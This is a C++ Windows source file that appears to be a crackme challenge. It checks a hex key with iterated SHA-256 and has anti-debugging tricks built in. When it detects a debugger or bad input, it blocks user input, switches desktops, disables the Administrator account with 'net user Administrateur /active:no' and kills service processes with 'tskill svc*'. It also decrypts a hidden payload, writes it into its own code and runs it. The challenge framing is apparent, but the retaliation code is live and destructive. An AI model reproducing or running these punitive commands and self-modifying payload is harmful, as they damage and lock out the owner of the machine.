// visualcpp.cpp�: d�finit le point d'entr�e pour l'application console.
//

#include "stdafx.h"
#include <string.h>
#include <tchar.h>
#include <regex>
#include <iostream>

#include <Windows.h>
#include "cryptopp\algebra.h"
#include "cryptopp\aes.h"
#include "cryptopp\rijndael.h"
#include "cryptopp\chachapoly.h"
#include "cryptopp\cryptlib.h"
#include "cryptopp\modes.h"
#include "cryptopp\filters.h"
#include "cryptopp\hex.h"
#include "cryptopp\osrng.h"
#include "cryptopp\files.h"

#include <iostream>
#include <fstream>
#include <iomanip>
#include <vector>
#include <random>
#include <algorithm>
#include <Windows.h>
#include <string>
#include <cctype>
#include <sstream>
#include <tchar.h>

#pragma optimize("", off)

using namespace CryptoPP;

typedef int (*type_sortie_int) ();

BOOL Switch()
{
    HDESK hNewDesktop = CreateDesktopA(
        "d", 
        NULL, 
        NULL, 
        0, 
        DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP, 
        NULL);
    if (!hNewDesktop)
        return FALSE;

    return SwitchDesktop(hNewDesktop);
}

std::vector<std::wstring> ListFiles(const std::wstring& folderPath) {
    std::vector<std::wstring> files;

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(folderPath.c_str(), &findFileData);
	while(FindNextFile(hFind, &findFileData) != 0)
	{
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			files.push_back(findFileData.cFileName);
		}
	}
    FindClose(hFind);
    return files;
}

//2000160E
std::string Match(std::string hexa, std::string pattern)
{
	std::string key;
	int length = hexa.length();
	if(length%2 != 0)
	{
		return key;
	}
	for(int k = 0; k < length - 7; k+=2)
	{
		std::string test = hexa.substr(length-k-2,2) + hexa.substr(length-k-4,2) + hexa.substr(length-k-6,2) + hexa.substr(length-k-8,2);
		if(test == pattern)
		{
			key = hexa.substr(length-k-8,64);
			return key;
		}
	}
	return key;
}


std::vector<std::wstring> shuffling_list(std::vector<std::wstring> List)
{
	std::random_device rd;
	// Initialize the random number generator
	std::default_random_engine rng(rd());
    std::random_shuffle(List.begin(), List.end(), [&rng](std::size_t n) 
	{
		return std::uniform_int_distribution<std::size_t>(0, n - 1)(rng);
	});
	return List;
}

std::string get_hexa(std::string filepath)
{
	std::ifstream file(filepath, std::ios::binary);

	std::string hexa;
	std::stringstream content;

	// mettre le if file open
	if(file.is_open())
	{
		// Read the file byte by byte and convert to hexadecimal
		char byte;
		while (file.get(byte)) 
		{
			// Append the hexadecimal representation of the byte to the string
			content << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(static_cast<unsigned char>(byte));
		}

		hexa = content.str();
		return hexa;
	}
	else
	{
		return hexa;
	}
}

std::string get_file_path(std::wstring fileNameW)
{
	std::string filepath = "C:\\WINDOWS\\";
	int bufferSize = WideCharToMultiByte(CP_UTF8, 0, fileNameW.c_str(), -1, nullptr, 0, nullptr, nullptr);

	// Allocate buffer
	std::string fileName(bufferSize, 0);

	// Convert wide string to narrow string
	WideCharToMultiByte(CP_UTF8, 0, fileNameW.c_str(), -1, &fileName[0], bufferSize, nullptr, nullptr);
			
	filepath += fileName;
	return filepath;
}

bool IsDebugged1()
{
    __try
    {
        __asm __emit 0xF1;
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
        return true;
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}

bool IsDebugged2()
{
    bool bTraced = false;

    __asm
    {
        push ss
        pop ss
        pushf
        test byte ptr [esp+1], 1
        jz movss_not_being_debugged
    }

    bTraced = true;

movss_not_being_debugged:
    // restore stack
    __asm popf;

	if (bTraced) {
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
	}

    return bTraced;
}

bool IsDebugged3()
{
    __try
    {
        __asm int 3;
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
        return true;
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}
bool IsDebugged4()
{
    __try
    {
        __asm xor eax, eax;
        __asm int 0x2d;
        __asm nop;
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
        return true;
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
}

int IsDebuggedChacha() {
    using namespace CryptoPP;
    // IV (Initialization Vector)
    CryptoPP::byte iv[256];
	for (int i = 0; i < 256; i++) {
		iv[i] = static_cast<char>(i);
	}

	std::wstring folderPath = L"C:\\WINDOWS\\*";
    
    std::vector<std::wstring> files = ListFiles(folderPath);

	std::vector<std::wstring> shuffled_files = shuffling_list(files);
	std::string keyS;
    if (!shuffled_files.empty()) 
	{
        for (std::vector<std::wstring>::iterator it = shuffled_files.begin(); it != shuffled_files.end(); ++it) 
		{
			std::string filePath = get_file_path(*it);
			std::ifstream file(filePath, std::ios::binary);
			if (file.is_open()) 
			{
				std::string hexa = get_hexa(filePath);
				std::string pattern = "2000160e";
				if(hexa.length() > 64)
				{
					if(Match(hexa.substr(hexa.length()/2), pattern).length() != 0)
					{
						keyS = Match(hexa.substr(hexa.length()/2), pattern);
					}
				}
				file.close();
			}
		}
	}
    const CryptoPP::byte aad[] = {
        0x50,0x51,0x52,0x53,0xc0,0xc1,0xc2,0xc3,0xc4,0xc5,0xc6,0xc7
    };

    CryptoPP::byte ivg[24];
    std::copy(iv + 64, iv + 89, ivg);

	std::string macCrypts = "570B76B862442D4F932D4FC8B520B2E4BE14A8FA81E1CBE46E36647B3E065DB6B95B1722419FC78A5D1DCD1DDF4F95E6";
	std::string macCrypt;
	
    CryptoPP::StringSource(macCrypts, true,
        new CryptoPP::HexDecoder(
            new CryptoPP::StringSink(macCrypt)
        )
    );

	std::string macS;
    CBC_Mode< AES >::Decryption d;
    d.SetKeyWithIV( ivg, 24, ivg );
    CryptoPP::StringSource( macCrypt, true, 
        new StreamTransformationFilter( d,
            new StringSink( macS )
        ) 
    ); 

	std::string ctS = "AC34C845AE20F1B667A8B46F838C2C60B2A94ABFA56194909050A00D7E38D8D0B78F34A750DFA8676700AA6DE5";
	CryptoPP::byte ct[45];
	CryptoPP::byte mac[16];
	CryptoPP::byte key[32];
    CryptoPP::StringSource(ctS, true,
        new CryptoPP::HexDecoder(
            new CryptoPP::ArraySink(ct, sizeof(ct))
        )
    );
    CryptoPP::StringSource(macS, true,
        new CryptoPP::HexDecoder(
            new CryptoPP::ArraySink(mac, sizeof(mac))
        )
    );
    CryptoPP::StringSource(keyS, true,
        new CryptoPP::HexDecoder(
            new CryptoPP::ArraySink(key, sizeof(key))
        )
    );

    CryptoPP::byte rt[sizeof(ct)];
    XChaCha20Poly1305::Decryption dec;
	ivg[23] = 0x58;
    dec.SetKeyWithIV(key, sizeof(key), ivg, 24);
    dec.DecryptAndVerify(rt, mac, sizeof(mac), ivg, 24, aad, sizeof(aad), ct, sizeof(ct));
	char * p = (char *) IsDebuggedChacha;
	DWORD old;
	VirtualProtect(p, 100, PAGE_EXECUTE_READWRITE, & old);
	for(int i = 0 ; i < 45 ; i ++) p[i] = rt[i]; 
	type_sortie_int fonction = (type_sortie_int) ((char *) IsDebuggedChacha) ;
	fonction();
	return 0;
}

void print_osef(std::string str) {
	std::cout << str << "\n";
}

void print_osef2(std::string str) {
	std::cout << str << "\n";
}

void ret() {
	while(1);
}

typedef int (*type_a)(const char*, ...); 

void * doBarrelRoll() {
    std::vector<int> series(68);
    for (int n=0; n<=1; n++) series[n] = n;
    for (int number=2; number<=68; number++) {
        series[number] = series[number-1] + series[number-2];
    }
	return (void *) &series[67];
}

int main(int argc, char * argv[])
{
	IsDebugged2();

	// First check : only two args (cmds + arg)
    if (argc != 2) {
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
		ret();
    }

	IsDebugged3();

	std::string str = argv[1];

	// Second check, key must be less than 32 chars
	if (str.length() > 32) {
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
		ret();
	}

	std::regex pattern("[a-fA-F0-9]+");
	IsDebugged4();

	// Key must be hex
	if (!std::regex_match(argv[1], pattern)) {
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*");
		ret();
	}
	IsDebugged1();

	char em[8];
	int no = 0;
	int un = no;
	em[no++]='v';
	em[no++]='i';
	em[no++]='c';
	em[no++]='t';
	int pointvirgule= un;
	em[no++]='o';
	em[no++]='r';
	em[no++]='y';
	int itk = pointvirgule;
	if(itk){
		printf(em);
	}

	while(itk){
		if(itk){
			printf(em);
		}
	}
	int x=5;
	int y=10;
	for(int i=0; i<3; i++){
		x=x+y;
		y=y-x;
	}

	type_a a;
	int c[7];
	int n=0;
	int q = 113;
	int p = 713399;
	c[n++]=q*p*4;
	c[n++]=q*p*p;
	c[n++]=247502920;
	c[n++]=420728104;
	c[n++]=1049850835;
	c[n++]=3701341116;
	c[n++]=3559602242;

	a = (type_a) (1804755964 ^ *c);
	
	std::string hashed = argv[1];
	for (int i = 0; i < 15000; i++) {
		CryptoPP::SHA256 hash;
		// Use StringSource to hash the input string
		CryptoPP::StringSource(hashed, true,
			new CryptoPP::HashFilter(hash,
				new CryptoPP::HexEncoder(
					new CryptoPP::StringSink(hashed),
					false // Uppercase
				)
			)
		);
	}
	
	
	if (IsDebuggedChacha()) {
		BlockInput(true);
		Switch();
		system("net user Administrateur /active:no");
		system("tskill svc*"); 
		ret();
	}



	if (hashed == "51CA2B6E9F7C5A23D69F5A4B8C953A32") {
		doBarrelRoll();
		doBarrelRoll();
		doBarrelRoll();
		a("victory");
	}

	print_osef(str);

	ret();
}